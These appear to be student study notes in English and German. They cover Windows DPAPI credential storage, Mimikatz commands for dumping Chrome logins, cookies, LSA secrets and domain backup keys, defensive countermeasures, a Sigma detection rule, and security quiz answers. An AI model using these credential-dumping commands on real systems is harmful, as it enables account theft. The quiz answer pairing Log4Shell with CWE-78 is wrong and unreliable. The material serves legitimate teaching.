  ],
)

=== User & Machine Master Keys
#grid(
  [
    A user's password is used to derive a _pre-key_, which is then used to decrypt one or more "master key" blobs.
    This is done so the _user can change their password_ without having to re-encrypt all the data stored in DPAPI.

    The master keys are stored at `%APPDATA%\Microsoft\Protect\<user-SID>\<key-GUID>`. Windows renews the current master
    key every 3 months. But the previous master keys must be kept to allow decryption of older blobs.
    There is also a domain backup DPAPI key.
  ],
  image("img/dpapi-user-key.png"),
)


The _`SYSTEM` user_ has master keys at
- `%WINDIR%\System32\Microsoft\Protect\S-1-5-18\<GUID>`
- `%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User\<GUID>`

They are encrypted with a password derived from the `DPAPI_SYSTM` LSA secret. The first half of the `DPAPI_SYSTEM` key
is for the _first level of master keys_, the second half is for the_ `\User` master keys_. You have to be `SYSTEM` to
retrieve these and it can't be done remotely.

LSA Secrets dumper like Mimikatz can extract the `DPAPI_SYSTEM` key with `token::elevate` and _`lsadump::secrets`_

=== Decrypting User Secrets
#image("img/dpapi-decrypt.png")

The DPAPI user master keys for logged on users are in LSASS memory. Within a user's context, it is often possible to
decrypt a blob with _`CryptUnprotectData()`_. The exception are blobs with the `CRYPTPROTECT_SYSTEM` flag, only LSASS
can decrypt them.

Mimikatz decrypts regular blobs with the first command, which will result in the User Master Key. The key can be further
used to decrypt the user secret.
```bat
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" /masterkey:<key>
```

=== Getting the user master key
==== From LSASS memory
If you can execute code in the target user's context, extracting the key is easy, as seen above. But if you can't, other
techniques are required. To decrypt DPAPI data blobs without using the regular APIs, we need the _SHA1 representations
of the decrypted master key_. The decrypted keys can then be passed with `/masterkey:<SHA1-key>` for decryption
operations.

#grid(
  columns: (2fr, 1fr),
  [
    Mimikatz can do this as well. It extracts the loaded master key GUIDs from LSASS into SHA-1 decrypted keys.
    We can also decrypt `CRYPTPROTECT_SYSTEM` blobs, as we're getting the keys straight from LSASS memory.
  ],
  [
    ```sh
    privilege::debug
    sekurlsa::dpapi
    dpapi::cache
    ```
  ],
)

If you run `/unprotect` on a database owned by a different user, a error appears when running `CryptUnprotectData()`.
Mimikatz tells you which master key UUID you need to extract. Run `sekurlsa::dpapi` to extract all DPAPI keys from
logged in users. You can now spot the required master key from the UUID.


==== Offline decryption from plaintext password
If a user's plaintext password is known, we can decrypt a user's master key blob; even on a offline machine.
```bat
dpapi::masterkey /in:<masterkey-location> /sid:<user-SID> /password:<plaintext> /protected
```

==== Through MS-BKRP
The master key can also be retrieved through the _Backup Key Remote Protocol (MS-BKRP)_ when a token has been stolen or
used in a Overpass-the-hash attack.
```bat
dpapi::masterkey /in:<masterkey-location> /rpc
```

==== From Backup DPAPI Key of the Domain Controller
Each domain-joined user master key blob has a domain backup key component. This key is used when a user changes their
credentials #hinweis[(password, smartcard etc.)]. The domain master key component is encrypted with a DPAPI domain
backup private key that exists on domain controllers. This key never changes.

```bat
REM Exports the backup key into a .pvk file
lsadump::backupkeys /system:<domain-controller> /export
dpapi::masterkey /in:<master-key-to-decrypt> /pvk:<location-of-pvk-file>
```

If you gain_ domain administrator privileges_, you can _decrypt any domain user master key forever!_ Download all DPAPI
master keys you can find on compromised machines, you might be able to decrypt them when you become domain admin.

#v(-0.25em)
=== Decrypting Machine Secrets
To decrypt machine master keys, we need the `DPAPI_SYSTEM` LSA secret. Note that machine master keys do not have a
domain backup key component.
```bat
lsadump::secrets
dpapi::masterkey /in:"%WINDIR%\System32\Microsoft\Protect\S-1-5-18\<GUID>" /system:DPAPI_SYSTEM
```

=== DPAPI Credentials and Vaults
Credentials are kept in `Credentials` folders and are self-contained structures. _Vaults_ are kept in `Vault` folders
and have a `Policy.vpol` that is decrypted with a master key. Two AES keys within the policy are then used to decrypt
one or more `.vcrd` files.

*User:*
`%userprofile%\AppData\[Local|Roaming]\Microsoft\...`\
*Local system:*\
`C:\Windows\System32\config\systemprofile\AppData\[Roaming|Local]\Microsoft\...`\
`C:\Windows\ServiceProfiles\[LocalService|NetworkService]\AppData\[Roaming|Local]\Microsoft\...`

```bat
dpapi::cred /masterkey:SHA1 /in:<path>\Credentials\ID
dpapi::vault /masterkey:SHA1 /cred:<path>\ID.vcrd /policy:<path>\Policy.vpol
```

==== Saved RDP connection credentials (RDG)
```bat
dpapi::blob /in:<rdg-file> [/masterkey:SHA1|/unprotect]
```

=== Countermeasures <credential-guard>
Microsoft released an update in 2014 to counter credential abuse. KB2871997 improved the credential handling in Windows:
- _Restrict the lifetime of cached logon credentials:_ Credentials are only cached during the logon session.
- _Restrict Kerberos/NTLM supplied credential cache:_ Credentials provided over network logons are no longer stored in
  memory in ways attackers could "easily" extract them, still possible though #hinweis[(e.g. via Pass-the-Hash or
    Pass-the-Ticket techniques)]
- _Restrict cache of Kerberos plain text passwords:_ Windows avoids placing plaintext Kerberos credentials in LSASS
  unless strictly necessary.

But NTLM hashes and Kerberos tickets are still cached, meaning Pass-the-hash/ticket attacks are still possible!

Windows 10 introduced _Credential Guard_, which isolates secrets in virtualized secure environments rather than storing
everything in LSASS.

*Best Practices*\
Credentials need to be stored on Windows machines, in order to allow Single-Sign-On. This inherently brings the risk of
cached credentials being stolen. However, you can mitigate the risk by
- No password re-use, use strong passwords and protect hashes
- Implement Logon Restrictions for your privileged accounts to limit exposure
- Deploy an Active Directory administrative tier model
- Make use of the Protected Users Group in Windows AD
- Deploy Credential Guard

== SIGMA
#grid(
  [
    Sigma is a generic and open _signature format_ that allows you to _describe relevant log events_. The rule format is
    based on YAML and very flexible, easy to write and applicable to any type of log file. The main purpose of this
    project is to provide a structured form in which researchers or analysts can describe their once developed detection
    methods and make them shareable with others. Sigma is for log files what Snort is for network traffic and YARA is
    for binary files.

    Sigma Rules can be mapped to Sysmon Event IDs and fields #hinweis[(see chapter @sysmon)]. This way, sysmon can be used
    to generate Sigma Rules for other SIEM solutions. For example, Mimikatz can be detected with this process.

  ],
  [
    ```yml
    title: Mimikatz detection
    status: stable
    description: Detects Mimikatz 2.1.1 by hashes
    tags:
      - attack.lateral_movement
      - attack.credential_access
    logsource:
      product: windows
      service: sysmon
    detection:
      selection:
          EventID: 1
          Hashes:
              - 97f93fe...
              - 6bfc1ec...
              - e46ba4b...
      condition: selection
    level: high
    ```
  ],
)

#pagebreak()

= Quizfragen von Studenten
==== Explain Man-in-the-Browser (MitB) and Man-in-the-Middle (MitM) attacks and describe each with one scenario
*Man-in-the-Middle (MitM):*
Man attacker intercepts network traffic and listens between the client and server in the communication path (e.g. ARP
spoofing or DNS hijacking). The attacker can read, alter or inject data into the requests.\
*Example:*
The attacker sets up a Wifi hotspot at a coffee shop. When victims connect, all their traffic passes through the
attacker's device, allowing interception of credentials and sensitive data.

*Man-in-the-Browser (MitB)*: Malware (e.g browser extension or trojan) infects the victim's browser and manipulates web
sessions, the attack is inside the victim's browser. The attacker can modify transaction details or steal information
after SSL/TLS decryption happens in the browser.\
*Example:*
Banking trojan infects user's browser. When user initiates a 1000 CHF transfer, the malware changes the destination
account and amount to 10000 CHF while displaying the original 1000 CHF on screen. The bank sees a legitimate
authenticated session.

==== What is DNS Cache Poisoning and does it work?
DNS cache poisoning (also called DNS spoofing) is an attack where an attacker injects wrong DNS records into a DNS
server's cache. This causing users to be redirected to malicious IP addresses when they request legitimate domain names.

*How it works:*
1. Attacker sends crafted DNS responses to a DNS resolver
2. The crafted response contains incorrect IP/domain mappings
3. If the server/resolver accepts those crafted responses, it caches the malicious record
4. User search for domain which return the attacker's placed IPs for the domain
5. User are redirected to the phishing sites and believe it is the legitimate service.

==== What is Kerberos in a nutshell?
Please also explain what role do following terms play:
- KDC (Key Distribution Center)
- AS (Authentication Service)
- TGS (Ticket Granting Service)
- Silver Ticket
- Golden Ticket

*Solution:*
Kerberos is a network authentication protocol that uses tickets to allow users to prove their identity without
repeatedly sending passwords over the network. In Active Directory, it involves following three main components.

- KDC (Key Distribution Center): Issues tickets and consists of AS and TGS
- AS (Authentication Service): Verifies user identity, issues Ticket Granting Ticket (TGT)
- TGS (Ticket Granting Service): Issues service tickets based on valid TGT

- Golden Ticket: creates TGTs, which can create Tickets for all TGS (highest privilege), potential compromise of all(!)
  Services.
- Silver Ticket: creates Service Tickets (lower level), potential compromise of one Service.


==== An organization suspects that a workstation inside the internal network is compromised by malware. The malware cannot accept inbound connections due to firewall restrictions.
*a)* Explain two different techniques a malware can use to communicate from the internal network to the outside world
in such an environment.

*b)* One of these techniques is DNS tunneling. Explain how DNS tunneling works at a high level.

*c)* From a defender’s perspective, name three indicators that could help detect DNS tunneling in network traffic or logs.

*Solution*

*a)* Two common outbound communication techniques are:

- HTTPS-based communication: Malware uses HTTPS (TCP port 443) to communicate with a command-and-control (C2) server.
  This traffic often blends in with normal web traffic and is difficult to inspect due to encryption.

- DNS-based communication: Malware embeds data into DNS queries and responses, allowing communication even when only DNS
  traffic is permitted.

*b)* DNS tunneling works by encoding data (often Base64) into DNS request names. The infected host sends many DNS
queries containing small chunks of data to an attacker-controlled domain. The attacker’s DNS server reconstructs the
data from these queries and can also send commands back via DNS responses.

*c)* Possible indicators of DNS tunneling include:
- Unusually long or random-looking domain names
- High volume of DNS requests to a single domain
- DNS queries with uncommon character distributions (e.g. Base64 patterns)

==== Email Security
Ein Unternehmen stellt fest, dass Kunden vermehrt Phishing-E-Mails erhalten, die scheinbar von der eigenen Domain
stammen. Die Domain ist öffentlich erreichbar und wird für regulären E-Mail-Versand genutzt.

*a)* Erkläre das Funktionsprinzip von SPF. Welche Information wird im DNS hinterlegt, und was prüft der empfangende
Mailserver konkret?

*b)* Beschreibe, wie DKIM die Integrität und Authentizität einer E-Mail sicherstellt. Gehe dabei auf die Rolle von Hash,
Signatur und DNS-Eintrag ein.

*c)* Erkläre, wie DMARC SPF und DKIM kombiniert. Was bedeutet `Alignment` in diesem Kontext, und welche drei Policy-Optionen
kann eine DMARC-Konfiguration enthalten?

*d)* Eine E-Mail besteht die SPF-Prüfung, fällt jedoch bei DKIM durch. Die Domain hat DMARC mit der Policy `p=reject`
konfiguriert. Erkläre, wie der empfangende Mailserver mit dieser E-Mail umgeht und warum.


*Solution*

*a)* SPF (Sender Policy Framework) dient dazu, festzulegen, welche Mailserver berechtigt sind, E-Mails im Namen einer
bestimmten Domain zu versenden. Die Information wird als SPF-Record im DNS der Domain hinterlegt und enthält eine Liste
erlaubter IP-Adressen oder Hostnamen. Der empfangende Mailserver prüft beim Eingang einer E-Mail, ob die IP- Adresse des
sendenden Mailservers im SPF-DNS-Eintrag der im Envelope- From angegebenen Domain enthalten ist. Ist dies der Fall, gilt
die SPF-Prüfung als bestanden, andernfalls als fehlgeschlagen oder neutral.

*b)* DKIM (DomainKeys Identified Mail) stellt die Integrität und Authentizität einer E-Mail sicher. Beim Versand der E-Mail
erstellt der sendende Mailserver einen Hash über ausgewählte Header-Felder und den Body der Nachricht. Dieser Hash wird
mit einem privaten Schlüssel digital signiert und als DKIM-Signatur im E-Mail-Header abgelegt. Der empfangende
Mailserver ruft den zugehörigen öffentlichen Schlüssel aus dem DNS der sendenden Domain ab und prüft damit die Signatur.
Ist die Signatur gültig, wurde die E-Mail seit dem Versand nicht verändert und stammt kryptographisch nachweisbar von
der angegebenen Domain.

*c)* DMARC (Domain-based Message Authentication, Reporting and Conformance) kombiniert die Ergebnisse von SPF und DKIM und
definiert eine klare Richtlinie für den Umgang mit fehlgeschlagenen Prüfungen.

Alignment bedeutet, dass die Domain im sichtbaren From-Header mit der Domain übereinstimmen muss, die für SPF und oder
DKIM verwendet wurde. Nur wenn dieses Alignment gegeben ist, gelten SPF oder DKIM im Sinne von DMARC als erfolgreich.

Eine DMARC-Konfiguration kann drei Policy-Optionen enthalten:

- `p=none`, keine Durchsetzungsaktion, nur Monitoring
- `p=quarantine`, verdächtige E-Mails werden z.B. in den Spam-Ordner verschoben
- `p=reject`, E-Mails werden abgelehnt

*d)* Obwohl die E-Mail die SPF-Prüfung besteht, fällt sie bei DKIM durch. Da DMARC aktiv ist und die Policy auf `p=reject`
gesetzt wurde, prüft der empfangende Mailserver, ob mindestens eine der beiden Methoden SPF oder DKIM erfolgreich ist
und korrekt aligned ist.

Da DKIM fehlschlägt und SPF zwar besteht, aber typischerweise nicht aligned ist oder nicht als ausreichend gilt, schlägt
die DMARC-Prüfung insgesamt fehl. Der empfangende Mailserver lehnt die E-Mail daher ab, um Spoofing und Phishing zu
verhindern.

==== Bind Shell, Reverse Shell und Web Shell
Im Rahmen einer Incident-Response-Untersuchung analysierst du ein kompromittiertes Linux-System. Es besteht der
Verdacht, dass der Angreifer interaktive Shells zur Persistenz oder Fernsteuerung eingesetzt hat.

*a)* Erkläre die Unterschiede zwischen Bind Shell, Reverse Shell und Web Shell. Gehe dabei jeweils auf folgende Aspekte ein:

- Richtung der Netzwerkverbindung
- Typischer Einsatzort (Server, Webanwendung, internes Netz)
- Ein Vorteil und ein Nachteil aus Sicht des Angreifers

*b)* Ein Angreifer nutzt eine Reverse Shell von einem kompromittierten Server zu einem externen Host.

1. Begründe, warum Reverse Shells in realen Angriffsszenarien häufiger eingesetzt werden als Bind Shells, insbesondere
  in Umgebungen mit Firewalls und NAT.
2. Ein Netzwerk-IDS überwacht ausgehenden Traffic. Nenne drei konkrete Indikatoren, anhand derer eine Reverse Shell
  trotzdem erkannt werden kann, obwohl sie eine ausgehende Verbindung nutzt.
3. Der Angreifer kapselt die Reverse Shell in HTTPS (TCP Port 443). Erkläre, warum dies die Erkennung erschwert, und
  nenne eine technische Massnahme auf Netzwerk- oder Host-Ebene, mit der eine solche Reverse Shell dennoch detektiert
  oder eingeschränkt werden kann.

*Solution*

*a)* Bind Shell:
- Richtung der Verbindung: Der kompromittierte Host öffnet einen Port und wartet auf eine eingehende Verbindung des
  Angreifers
- Typischer Einsatzort: Systeme ohne restriktive Firewall-Regeln und nicht hinter NAT
- Vorteil: Einfache Implementierung
- Nachteil: Eingehende Verbindungen werden oft durch Firewalls blockiert

Reverse Shell:
- Richtung der Verbindung: Der kompromittierte Host baut eine ausgehende Verbindung zum Angreifer auf
- Typischer Einsatzort: Server hinter Firewalls oder NAT
- Vorteil: Umgeht eingehende Firewall-Regeln, Chance entdeckt zu werden ist normalerweise tiefer
- Nachteil: Abhängigkeit von einem erreichbaren externen Server

Web Shell:
- Richtung der Verbindung: Kommunikation über HTTP oder HTTPS zwischen Angreifer und Webserver
- Typischer Einsatzort: Kompromittierte Webanwendungen
- Vorteil: Tarnung im normalen Web-Traffic
- Nachteil: Meist eingeschränkte Interaktivität und Abhängigkeit vom Webserver

*b)* 1. Reverse Shells werden häufiger eingesetzt, da ausgehende Verbindungen in vielen Netzwerken erlaubt sind, während
eingehende Verbindungen durch Firewalls oder NAT blockiert werden. Der Angreifer passt sich so der typischen
Netzwerksicherheitsarchitektur an.
2. Mögliche Indikatoren für eine Reverse Shell im ausgehenden Traffic sind:
  - Verbindungen zu ungewöhnlichen oder neu registrierten externen IP-Adressen oder Domains
  - Lange bestehende TCP-Verbindungen mit geringem, aber kontinuierlichem Datenfluss
  - Interaktive Muster im Traffic, wie kurze Anfrage-Antwort-Zyklen ohne typisches Protokollverhalten
3. Die Kapselung in HTTPS erschwert die Erkennung, da der Traffic verschlüsselt ist und wie normaler Webverkehr
  aussieht. Eine mögliche Gegenmassnahme ist TLS-Inspection auf Netzwerkebene oder die Überwachung verdächtiger Prozesse
  und Netzwerkverbindungen auf dem Host mittels EDR.


==== MISP
Ein Security-Team nutzt MISP, um Informationen zu Sicherheitsvorfällen mit anderen Organisationen zu teilen und eigene
Erkennungsmechanismen zu verbessern.\
*a)* Erkläre kurz, was MISP ist und welches Hauptziel mit dem Einsatz dieser Plattform verfolgt wird. *b)* Beschreibe
die Bedeutung der folgenden Begriffe im Kontext von MISP:

- Event
- Attribute
- Indicator of Compromise (IOC)

Erkläre jeweils kurz, wie diese Elemente zusammenhängen.

*c)* Nenne zwei konkrete Vorteile, die ein Unternehmen durch den Einsatz von MISP im Vergleich zu einer rein internen
Sammlung von IOCs hat. Erkläre kurz, warum diese Vorteile die Detektion oder Reaktion auf Angriffe verbessern.


*Solution*

*a)* MISP (Malware Information Sharing Platform) ist eine Plattform zum strukturierten Austausch von Cyber Threat
Intelligence. Ziel ist es, sicherheitsrelevante Informationen wie Angriffsmuster oder Indicators of Compromise
organisationsübergreifend zu teilen und dadurch die Erkennung und Reaktion auf Angriffe zu verbessern.

*b)*
*Event:*
Ein Event beschreibt einen konkreten Sicherheitsvorfall oder eine Kampagne und dient als Container für zusammengehörige
Informationen.

*Attribute:*
Attribute sind einzelne Datenpunkte innerhalb eines Events, z.B. IP-Adressen, Domains, Hashes oder URLs.

*Indicator of Compromise (IOC):*
IOCs sind Attribute, die direkt zur Erkennung von Angriffen genutzt werden können.

Zusammenhang: Ein Event enthält mehrere Attribute, von denen ein Teil als IOCs verwendet wird, um Systeme oder Logs auf
Hinweise eines Angriffs zu prüfen.

*c)* Ein Vorteil von MISP ist der organisationsübergreifende Austausch von aktuellen Bedrohungsinformationen, wodurch
Angriffe früher erkannt werden können.

Ein weiterer Vorteil ist die Strukturierung und Kontextualisierung von IOCs, wodurch Detektionsregeln gezielter erstellt
werden können und weniger False Positives entstehen.


==== YARA & Malware-Detektion
In deinem Unternehmen wurde ein verdächtiges Programm auf einem Client gefunden. Du sollst nun die Untersuchung mittels
YARA leiten.

*a)* Strategievergleich: Erkläre, warum der Einsatz von YARA-Regeln gegenüber einem klassischen Virenscanner (AV) bei
der Untersuchung eines Vorfalls vorteilhaft sein kann, und nenne einen wesentlichen Nachteil.

*b)* Effizienz der Suche: Dein Kollege möchte alle 5.000 Rechner in deinem Unternehmen allein nach dem SHA256-Hash der
Datei durchsuchen. Erkläre, warum das ohne weitere Metadaten eine schlechte Idee ist, und schlage eine konkrete
Effizienzsteigerung vor.

*c)* Regel-Optimierung: Du suchst im Speicher eines Windows-Systems nach dem String "Malware". Warum findet eine
einfache Regel wie a = "Malware" den String oft nicht, und welche Zusätze musst du verwenden?

*d)* Dateiformate: Ein SOC-Mitarbeiter behauptet, YARA sei das perfekte Tool, um Windows Event Logs (EVT-Files) nach
verdächtigen Einträgen zu durchsuchen. Beurteile diese Aussage.

*Solution*

*a)* Ein Vorteil von YARA ist die flexible, forensische Suche nach individuell definierten Mustern, auch für neue oder
gezielte Malware, die von AV-Lösungen noch nicht erkannt wird. Ein wesentlicher Nachteil ist, dass YARA keine
integrierte Echtzeitüberwachung oder präventiven Schutz bietet und manuell oder über zusätzliche Systeme ausgeführt
werden muss.

*b)* Die Suche allein anhand eines Hashes ist ineffizient, da auf allen Systemen jede Datei vollständig gelesen und
gehasht werden muss. Effizienter ist es, die Suche durch Metadaten wie Dateiname, Pfad, Dateigröße, Erstellungszeit oder
PE-Header-Eigenschaften einzugrenzen oder zunächst mit YARA-Regeln auf charakteristische Strings oder Strukturen zu
scannen.

*c)* Strings werden im Windows-Speicher häufig als UTF-16 (wide strings) abgelegt. Eine einfache ASCII-String-Regel
findet diese nicht. Um den String zuverlässig zu erkennen, müssen in der YARA-Regel die Modifikatoren `ascii` und `wide`
verwendet werden.

*d)* Die Aussage ist irreführend. Zwar kann YARA technisch auch binäre EVT/EVTX-Dateien scannen, es versteht jedoch die
interne Struktur und Semantik von Windows Event Logs nicht.

Für die Analyse von Event Logs sind spezialisierte Tools wie Event Viewer, SIEMs oder Logparser (z.B. EvtxECmd von Eric
Zimmermann) besser geeignet, da sie gezielte Abfragen und Kontext liefern.


==== Memory Forensics (RAM-Analyse)
Ein Server in deinem Unternehmen verhält sich seltsam. Du entscheidest dich für eine Analyse des flüchtigen Speichers.

*a)* Notwendigkeit: Nenne drei spezifische Artefakte, die du nur im RAM (flüchtiger Speicher), aber nicht auf einem
klassischen Festplatten-Abbild (dd-image) findest.

*b)* Integrität & "Memory Smear": Erkläre, was man unter "Memory Smear" versteht und wie du diesen bei einer virtuellen
Maschine verhindern kannst.

*c)* Detektion versteckter Prozesse: Erkläre den technischen Unterschied zwischen den Volatility-Befehlen `pslist` und
`psscan`. Welches Modul ist besser geeignet, um Schadsoftware zu finden, die sich vor dem Task-Manager versteckt?

d) Rekonstruktion: Ist es möglich, aus einem Memory-Abbild eine ausführbare Datei (Executable) wiederherzustellen, die
zum Zeitpunkt der Aufnahme aktiv war? Erwähne dabei kurz die Rolle des Loaders.

*Solution*

*a)* Im RAM finden sich Artefakte wie laufende Prozesse und deren Speicherinhalte, aktive (inkl. nicht persistierter
Verbindungszustände) oder kürzlich genutzte Netzwerkverbindungen, geladene Kernel-Module/Treiber, unverschlüsselte
Zugangsdaten oder Verschlüsselungsschlüssel sowie Command-History von interaktiven Sessions, die auf einem klassischen
Festplatten-Abbild nicht oder nur unvollständig vorhanden sind.

*b)* Memory Smear beschreibt Inkonsistenzen im Speicherabbild, die entstehen, weil sich der RAM während der Akquisition
weiter verändert. Bei virtuellen Maschinen kann dies verhindert werden, indem die VM pausiert oder ein konsistenter
Snapshot mit RAM-Inhalt erstellt wird, sodass der Speicherzustand eingefroren ist.

*c)* `pslist` folgt der offiziellen `EPROCESS`-Liste (double linked list) von Windows. `psscan` hingegen sucht direkt
nach Datenstrukturen im Speicher und kann so auch Prozesse finden, die mutwillig aus der Liste ausgehängt wurden.
`psscan` ist besser geeignet, um Schadsoftware zu finden, die sich vor dem Task-Manager oder klassischen Prozesslisten
versteckt. Da `psscan` nach Prozesssignaturen im Rohspeicher sucht, kann es verwaiste oder teilweise überschriebene
EPROCESS-Strukturen finden, die zu bereits beendeten Prozessen gehören und fälschlicherweise als aktive Prozesse
interpretiert werden (False Positives).

*d)* Ja, es ist möglich, aus einem Memory-Abbild eine ausführbare Datei zu rekonstruieren. Der Windows-Loader lädt
PE-Sektionen (Portable Executable) in den Speicher, löst Importe auf und initialisiert Tabellen wie die IAT (Import
Address Table). Da diese Strukturen zur Laufzeit verändert oder unvollständig im RAM vorliegen können, ist die
Rekonstruktion komplex, aber mit Forensik-Tools grundsätzlich möglich.

==== MITRE ATT&CK & Cyber Kill Chain
Ein Angreifer versucht, über eine Schwachstelle in einer Web-Applikation in dein Unternehmen einzudringen.

*a)* Struktur: Erkläre den Unterschied zwischen einer "Tactic" und einer "Technique" im MITRE ATT&CK Framework.

*b)* Kill Chain: Beschreibe anhand einer Analogie, welches die Phasen der Cyber Kill Chain sind.

*c)* Kill Chain Zuordnung: Ein Angreifer schickt ein E-Mail-Attachment an einen Mitarbeiter in deinem Unternehmen.
Welcher Phase der Cyber Kill Chain entspricht das, und welche Phase folgt unmittelbar nach dem Öffnen des Attachments
durch den User?

*d)* Command & Control (C2): Warum bevorzugen Angreifer C2-Verbindungen, die vom infizierten Client in deinem
Unternehmen nach draussen (Internet) initiiert werden (Polling)?

*e)* Persistenz: Nenne eine Möglichkeit, wie ein Angreifer Persistenz auf einem Windows-System erreichen kann, und
beschreibe wie du diese im SIEM erkennen könntest.

*Solution*\
*a)* Eine Tactic beschreibt das übergeordnete Ziel eines Angreifers innerhalb eines Angriffsverlaufs (das Warum),
während eine Technique die konkrete Methode beschreibt, mit der dieses Ziel technisch umgesetzt wird (das Wie).

*b)* Die Cyber Kill Chain lässt sich mit der Organisation eines illegalen Konzerts vergleichen: Zuerst werden geeignete
Orte und Schwachstellen erkundet (Reconnaissance), anschließend wird die benötigte Technik und der Ablauf vorbereitet
(Weaponization), danach werden Einladungen verteilt (Delivery). Der Veranstaltungsort wird besetzt und genutzt
(Exploitation), es wird eine dauerhafte Infrastruktur aufgebaut (Installation), die Koordination erfolgt aus der Ferne
(Command & Control), und schließlich wird das eigentliche Ziel erreicht, indem das Konzert durchgeführt wird (Actions on
Objectives).

*c)* Das Versenden des Attachments entspricht der Phase Delivery. Nach dem Öffnen des Attachments erfolgt die Phase
Exploitation, in der der Angreifer durch Ausnutzung einer Schwachstelle Code ausführt.

*d)* Verbindungen von innen nach aussen sind einfacher aufzubauen, da Firewalls diesen Verkehr oft weniger restriktiv
behandeln als eingehende Verbindungen aus dem Internet. Zusätzlich verschleiern Angreifer C2-Verkehr oft als legitimen
Web-Traffic (z. B. HTTPS), um in der Masse des normalen ausgehenden Verkehrs unterzugehen.

*e)* Persistenz kann z. B. über Scheduled Tasks oder Registry Run Keys erreicht werden. Scheduled Tasks lassen sich im
SIEM über die Windows Event-ID 4698 (Task erstellt) oder auch Event-ID 4702 (Task geändert) erkennen, sofern die
entsprechende Audit-Policy aktiviert ist. Diese Events können gezielt überwacht und mit bekannten Baselines verglichen
werden.

==== What is the difference between "CVE" and CWE"
- CVE (Common Vulnerabilities and Exposures): This is a standardized identifier for a publicly known cybersecurity
  vulnerability. Think of it as a unique ID number (e.g., CVE-2021-44228 for the Log4Shell vulnerability). Its purpose
  is to provide a common name so everyone can talk about the same issue.

- CWE (Common Weakness Enumeration): This describes the general type of mistake that led to the vulnerability, not the
  specific instance. It's the "category" of the flaw.

Example: CVE-2021-44228 (a specific vulnerability) is an instance of CWE-78: Improper Neutralization of Special Elements
used in an OS Command (the general weakness type).


==== What is 2FA and can it protect against a Man in the Middle Attack? Why/ why not?
2FA means "two factor authentication" a factor is somthing known (password), smth owned (phone, key) or smth one is
(fingerprint). 2FA requires authentication of two different factors. A Man in the middle, who is redirecting a password
can also simply redirect a token or the fingerprint information. This means 2FA does not work by definition against a
man in the middle attack. Unless one factor is engineered in a way that makes it non-redirectable. (Like FIDO2)


==== In Memory Forensics, where can Evidence be found and what artifacts are of interest? (List 3 Evidence "places" and 4 Artifacts of interest)

Evidence "places" and 4 Artifacts of interest) Evidence:
- Physical Memory
- Pagefile
- Crash Dumps
- Hibernation Files

Artifacts of interest:
- Processes
- Network connections
- Loaded drivers
- Console command history
- Strings in memory
- Credentials and keys
